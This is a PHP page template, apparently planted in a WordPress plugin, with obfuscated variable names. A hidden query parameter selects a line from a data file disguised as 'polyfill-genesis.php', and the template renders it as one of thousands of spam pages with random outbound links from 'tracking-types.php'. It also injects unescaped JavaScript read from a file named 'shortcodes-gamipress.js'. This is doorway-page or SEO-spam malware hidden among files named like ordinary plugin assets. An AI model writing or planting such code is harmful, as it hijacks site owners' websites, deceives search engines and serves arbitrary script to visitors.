<?php
$gQyTla8 = intval(get_query_var('gmdxcw'));

if ($gQyTla8 < 1 || $gQyTla8 > 4576) return;
$xXh5mH = file(plugin_dir_path(__FILE__).'polyfill-genesis.php', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

$rz3HGEz = explode(';', $xXh5mH[$gQyTla8]);
if (count($rz3HGEz) < 2) return;
$fdTpdNaP = $rz3HGEz[0];
$pqiN6bz2Y7  = $rz3HGEz[1];
$dPwTon = $rz3HGEz[2];
$zqpsZv  = $rz3HGEz[3];
$gKtjrTh = $rz3HGEz[4];
set_query_var('dvjvlmzi', $fdTpdNaP);

$qWdWqBE = '';
$onvEmlYP = plugin_dir_path(__FILE__).'tracking-types.php';
if (is_file($onvEmlYP)) {
	$kFhFywbVps = file($onvEmlYP, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
	array_shift($kFhFywbVps);
	shuffle($kFhFywbVps);
	$wQnIM = mt_rand(2, 5);
	if (count($kFhFywbVps) > $wQnIM) {
		for ($yjPfiGxv8 = 0; $yjPfiGxv8 < $wQnIM; $yjPfiGxv8++) {
			$sqHABa7w3V = array_shift($kFhFywbVps);
			$qWdWqBE .= '<p><a href="'.$sqHABa7w3V.'">'.$sqHABa7w3V.'</a>' . "</p>\n";
		}
	}
}

status_header(200);
get_header();
?>

<div id="primary" class="content-area">
	<main id="main" class="site-main wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
		<article class="page type-page wp-block-group alignfull has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
			<header class="entry-header">
				<h1 class="entry-title wp-block-post-title"><?php echo $fdTpdNaP; ?></h1>
			</header>
			<div class="entry-content alignfull wp-block-post-content has-global-padding is-layout-constrained wp-block-post-content-is-layout-constrained">
				<?php
				echo "<p>" . $pqiN6bz2Y7 . "</p>\n";
				if (strlen($zqpsZv) > 0) echo "<p>" . $zqpsZv . "</p>\n";
				if (strlen($dPwTon) > 0) echo "<p>" . $dPwTon . "</p>\n";
				if (strlen($gKtjrTh) > 0) echo '<p><a href="#"><img src="'.$gKtjrTh.'"></a>' . "</p>\n";
				echo $qWdWqBE;
				?>
			</div>
		</article>
	</main>
</div>

<?php
$oLZ9TUdK = plugin_dir_path(__FILE__) . 'shortcodes-gamipress.js';
if (is_file($oLZ9TUdK)) {
	echo '<script type="text/javascript">';
	echo file_get_contents($oLZ9TUdK);
	echo '</script>';
}
get_footer();
?>
